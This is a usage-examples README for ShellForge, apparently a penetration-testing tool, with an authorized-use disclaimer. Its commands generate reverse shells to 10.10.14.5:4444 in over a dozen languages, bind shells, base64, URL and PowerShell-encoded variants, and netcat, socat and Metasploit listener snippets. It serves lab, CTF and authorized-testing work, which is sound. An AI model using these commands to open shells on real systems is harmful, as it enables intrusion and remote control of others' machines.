# ShellForge — Usage Examples

**Author:** Mostafa Tamime

> **AUTHORIZED USE ONLY** — Use these payloads only on systems you own or have
> explicit written permission to test (labs, CTFs, authorized engagements).

## Prerequisites

```bash
pip install -r requirements.txt
```

## List supported languages

```bash
python shellforge.py --list-langs
```

## Reverse shells

### Bash

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l bash
```

### Python / Python3

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l python
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l python3
```

### Perl

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l perl
```

### PHP

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l php
```

### Ruby

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l ruby
```

### Netcat

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l nc
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l nc-mkfifo
```

### Socat

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l socat
```

### PowerShell (one-liner + save .ps1)

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l powershell
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l powershell -o reverse.ps1
```

### Java (save .java for compile)

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l java -o Reverse.java
# javac Reverse.java && java Reverse
```

### C# (save .cs)

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l csharp -o Reverse.cs
```

### C (save .c and compile)

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l c -o reverse.c
# gcc -o reverse reverse.c && ./reverse
```

### Go

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l golang
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l golang -o reverse.go
```

### Lua

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l lua
```

### AWK

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l awk
```

### All languages at once

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l all
```

## Bind shells

```bash
python shellforge.py -t bind -p 5555 -l bash
python shellforge.py -t bind -p 5555 -l python3
python shellforge.py -t bind -p 5555 -l c -o bind.c
```

## Encodings

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l bash --encode base64
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l bash --encode urlencode
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l powershell --encode ps-encoded
```

## Listener helpers

```bash
python shellforge.py -t reverse -i 10.10.14.5 -p 4444 -l bash --listener
```

Prints `nc`, `rlwrap nc`, `socat`, and `msfconsole` multi/handler snippets.
